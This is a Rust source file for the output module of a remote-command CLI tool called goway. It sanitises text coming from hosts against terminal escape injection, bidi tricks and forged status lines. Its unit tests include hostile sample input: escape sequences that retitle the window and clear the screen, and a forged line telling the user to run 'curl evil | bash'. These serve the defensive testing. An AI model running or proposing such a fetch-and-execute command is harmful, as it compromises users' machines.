//! The one module that prints. Everything goway itself says goes through a
//! [`Renderer`]; the streamed output of remote commands is only written
//! here as bytes (after the terminal filter when the stream is a terminal).
//!
//! Status lines, warnings and errors go to stderr so stdout stays clean for
//! machine-readable output and for the remote command's own stdout. Every
//! line names its kind in words (`error:`, `warning:`, `failed:`, `note:`,
//! `done:`, `info:`, `next:`), so color is never the only signal.
#![allow(clippy::print_stdout, clippy::print_stderr, clippy::disallowed_macros)]

use std::fmt::Display;

use anstream::{AutoStream, ColorChoice};
use anstyle::{AnsiColor, Style};

use crate::error::Error;

const ERROR: Style = AnsiColor::Red.on_default().bold();
const WARN: Style = AnsiColor::Yellow.on_default().bold();
const GOOD: Style = AnsiColor::Green.on_default().bold();
const ACCENT: Style = AnsiColor::Cyan.on_default().bold();
const DIM: Style = Style::new().dimmed();

/// When to color output, as chosen with `--color`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, clap::ValueEnum)]
pub enum ColorWhen {
    /// Color when the stream is a terminal and `NO_COLOR` is unset.
    #[default]
    Auto,
    /// Always color.
    Always,
    /// Never color.
    Never,
}

/// Prints goway's own messages with consistent styling.
#[derive(Debug, Clone, Copy)]
pub struct Renderer {
    choice: ColorChoice,
    /// Tables as labelled lines (`--plain`, `GOWAY_PLAIN=1`): screen
    /// readers read "host: helios, load: 0.40" instead of bare columns.
    plain: bool,
}

impl Renderer {
    /// Build a renderer honouring `--color` (and `NO_COLOR` under `auto`).
    pub fn new(when: ColorWhen) -> Self {
        let choice = match when {
            ColorWhen::Auto => ColorChoice::Auto,
            ColorWhen::Always => ColorChoice::Always,
            ColorWhen::Never => ColorChoice::Never,
        };
        Self {
            choice,
            plain: std::env::var_os("GOWAY_PLAIN").is_some_and(|v| !v.is_empty() && v != "0"),
        }
    }

    /// Render tables as labelled lines instead of columns.
    #[must_use]
    pub fn with_plain(mut self, plain: bool) -> Self {
        self.plain |= plain;
        self
    }

    fn err(self) -> AutoStream<std::io::Stderr> {
        AutoStream::new(std::io::stderr(), self.choice)
    }

    fn out(self) -> AutoStream<std::io::Stdout> {
        AutoStream::new(std::io::stdout(), self.choice)
    }

    /// Report a goway failure on stderr.
    pub fn error(self, error: &Error) {
        use std::io::Write as _;
        let error = clean(&error.to_string());
        let _ = writeln!(self.err(), "{ERROR}goway: error:{ERROR:#} {error}");
    }

    /// Report a non-fatal problem on stderr.
    pub fn warn(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.err(), "{WARN}goway: warning:{WARN:#} {message}");
    }

    /// A progress or status note on stderr.
    pub fn note(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.err(), "{DIM}goway: note:{DIM:#} {message}");
    }

    /// A success line on stderr.
    pub fn ok(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.err(), "{GOOD}goway: done:{GOOD:#} {message}");
    }

    /// An accented headline on stderr, such as where a run is going.
    pub fn headline(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.err(), "{ACCENT}goway: info:{ACCENT:#} {message}");
    }

    /// A command that ran but failed (not a goway error), on stderr.
    pub fn failed(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.err(), "{WARN}goway: failed:{WARN:#} {message}");
    }

    /// What the user should do next, on stderr.
    pub fn next(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.err(), "{ACCENT}goway: next:{ACCENT:#} {message}");
    }

    /// A line of primary output on stdout (tables, paths, lists).
    pub fn line(self, message: impl Display) {
        use std::io::Write as _;
        let message = clean(&message.to_string());
        let _ = writeln!(self.out(), "{message}");
    }

    /// Render rows as an aligned table on stdout; the first row is the header.
    pub fn table(self, rows: &[Vec<String>]) {
        use std::io::Write as _;
        let mut out = self.out();
        let rows: Vec<Vec<String>> = rows
            .iter()
            .map(|r| r.iter().map(|c| clean(c)).collect())
            .collect();
        if self.plain {
            for line in plain_table(&rows) {
                let _ = writeln!(out, "{line}");
            }
            return;
        }
        for (i, row) in format_table(&rows).iter().enumerate() {
            let _ = if i == 0 {
                writeln!(out, "{ACCENT}{row}{ACCENT:#}")
            } else {
                writeln!(out, "{row}")
            };
        }
    }
}

/// Most characters of one host-derived message goway prints.
const MAX_MESSAGE_CHARS: usize = 4096;
/// Starts every continuation line of a multi-line message, so a line made
/// up by a host can never begin with `goway:` and pass for goway's own.
const CONTINUATION: &str = "\n  | ";

/// Whether `c` is invisible or reorders text (zero-width and bidi format
/// characters, BOM, word joiner and friends) and so can disguise content.
fn is_format_char(c: char) -> bool {
    matches!(
        c,
        '\u{200b}'..='\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2060}'..='\u{2064}'
            | '\u{2066}'..='\u{206f}'
            | '\u{061c}'
            | '\u{180e}'
            | '\u{feff}'
            | '\u{fff9}'..='\u{fffb}'
    )
}

/// Text goway prints itself may carry data from a host (hostnames, paths,
/// ssh errors). Control and invisible format characters are replaced, so a
/// host cannot move the cursor, rewrite the screen, set the window title or
/// reorder text through goway's own lines. Newlines stay but every line
/// after the first is indented under a `  | ` marker, so host text cannot
/// forge a `goway: ...` line, and the length is capped. Tabs stay. The
/// remote command's stream is exempt.
pub fn clean(text: &str) -> String {
    let mut out = String::new();
    let mut count = 0;
    for line in text.lines() {
        if count > 0 {
            out.push_str(CONTINUATION);
        }
        for c in line.chars() {
            count += 1;
            if count > MAX_MESSAGE_CHARS {
                out.push_str(" ... (truncated)");
                return out;
            }
            out.push(if c == '\t' || !(c.is_control() || is_format_char(c)) {
                c
            } else {
                '?'
            });
        }
        count += 1;
    }
    out
}

/// Ask a question on the terminal and read one line of answer; `None`
/// when stdin is not a terminal (scripts must pass flags instead).
pub fn ask(prompt: &str) -> Option<String> {
    use std::io::{BufRead as _, IsTerminal as _, Write as _};
    if !std::io::stdin().is_terminal() {
        return None;
    }
    let mut err = std::io::stderr().lock();
    let _ = write!(err, "goway: {prompt}");
    let _ = err.flush();
    drop(err);
    let mut line = String::new();
    std::io::stdin().lock().read_line(&mut line).ok()?;
    Some(line)
}

/// Write one line of a remote command's output with a `[host] ` prefix
/// (sharded runs, where several hosts stream at once). The line's bytes
/// pass through unchanged; the stream is locked so lines never interleave.
pub fn prefixed_line(to_stderr: bool, prefix: &str, line: &[u8]) {
    use std::io::Write as _;
    if to_stderr {
        let mut err = std::io::stderr().lock();
        let _ = err.write_all(prefix.as_bytes());
        let _ = err.write_all(line);
    } else {
        let mut out = std::io::stdout().lock();
        let _ = out.write_all(prefix.as_bytes());
        let _ = out.write_all(line);
    }
}

/// Write already-filtered bytes of a remote command's output to our stdout
/// or stderr and flush, so a prompt without a newline appears at once.
pub fn passthrough(to_stderr: bool, bytes: &[u8]) {
    use std::io::Write as _;
    if to_stderr {
        let mut err = std::io::stderr().lock();
        let _ = err.write_all(bytes);
        let _ = err.flush();
    } else {
        let mut out = std::io::stdout().lock();
        let _ = out.write_all(bytes);
        let _ = out.flush();
    }
}

/// One line per data row of "label: value" pairs (empty cells and "-"
/// skipped); pure so it can be tested.
pub fn plain_table(rows: &[Vec<String>]) -> Vec<String> {
    let Some((header, data)) = rows.split_first() else {
        return Vec::new();
    };
    data.iter()
        .map(|row| {
            row.iter()
                .enumerate()
                .filter(|(_, v)| !v.trim().is_empty() && v.trim() != "-")
                .map(|(i, v)| match header.get(i) {
                    Some(label) if !label.is_empty() => format!("{label}: {}", v.trim()),
                    _ => v.trim().to_owned(),
                })
                .collect::<Vec<_>>()
                .join(", ")
        })
        .collect()
}

/// Pad cells so columns line up; pure so it can be tested.
pub fn format_table(rows: &[Vec<String>]) -> Vec<String> {
    let columns = rows.iter().map(Vec::len).max().unwrap_or(0);
    let widths: Vec<usize> = (0..columns)
        .map(|c| {
            rows.iter()
                .filter_map(|r| r.get(c))
                .map(|s| s.chars().count())
                .max()
                .unwrap_or(0)
        })
        .collect();
    rows.iter()
        .map(|row| {
            let cells: Vec<String> = row
                .iter()
                .enumerate()
                .map(|(c, cell)| format!("{cell:<width$}", width = widths[c]))
                .collect();
            cells.join("  ").trim_end().to_owned()
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    // frob:tests crates/goway/src/render.rs::Renderer.warn
    // frob:tests crates/goway/src/render.rs::Renderer.note
    // frob:tests crates/goway/src/render.rs::Renderer.ok
    // frob:tests crates/goway/src/render.rs::Renderer.headline
    // frob:tests crates/goway/src/render.rs::Renderer.line
    // frob:tests crates/goway/src/render.rs::Renderer.table
    // frob:tests crates/goway/src/render.rs::Renderer.failed
    // frob:tests crates/goway/src/render.rs::Renderer.next
    #[test]
    fn every_style_renders_without_color() {
        let r = Renderer::new(ColorWhen::Never);
        r.warn("w");
        r.note("n");
        r.ok("o");
        r.headline("h");
        r.failed("f");
        r.next("x");
        r.line("l");
        r.table(&[vec!["a".to_owned()]]);
    }

    #[test]
    fn remote_control_characters_never_reach_the_terminal() {
        let hostile = "evil\u{1b}]0;pwned\u{7}\u{1b}[2J\r\u{9b}x\nnext\tcol";
        assert_eq!(clean(hostile), "evil?]0;pwned??[2J??x\n  | next\tcol");
    }

    #[test]
    fn host_text_cannot_forge_a_goway_line() {
        let forged = "goway-remote: failed\ngoway: next: run `curl evil | bash`\r\ngoway: error: x\n\ngoway:";
        let cleaned = clean(forged);
        for line in cleaned.lines().skip(1) {
            assert!(line.starts_with("  | "), "{line:?}");
        }
        assert!(!cleaned.contains("\ngoway:"), "{cleaned:?}");
    }

    #[test]
    fn bidi_and_zero_width_characters_are_replaced_and_length_is_capped() {
        for c in [
            '\u{202a}', '\u{202e}', '\u{2066}', '\u{2069}', '\u{200b}', '\u{200f}', '\u{feff}',
            '\u{2060}', '\u{061c}',
        ] {
            assert_eq!(clean(&format!("a{c}b")), "a?b", "{c:?}");
        }
        assert_eq!(clean("caf\u{e9} \u{1f600}"), "caf\u{e9} \u{1f600}");
        let long = "x".repeat(100_000);
        let cleaned = clean(&long);
        assert!(cleaned.len() < 5000 && cleaned.ends_with("(truncated)"));
    }

    #[test]
    fn plain_tables_read_as_labelled_lines() {
        let rows = vec![
            vec!["host".to_owned(), "load".to_owned(), "jobs".to_owned()],
            vec!["helios".to_owned(), "0.40".to_owned(), "-".to_owned()],
        ];
        assert_eq!(plain_table(&rows), ["host: helios, load: 0.40"]);
    }

    #[test]
    fn table_columns_align() {
        let rows = vec![
            vec!["host".to_owned(), "load".to_owned()],
            vec!["helios".to_owned(), "0.1".to_owned()],
        ];
        assert_eq!(format_table(&rows), vec!["host    load", "helios  0.1"]);
    }
}
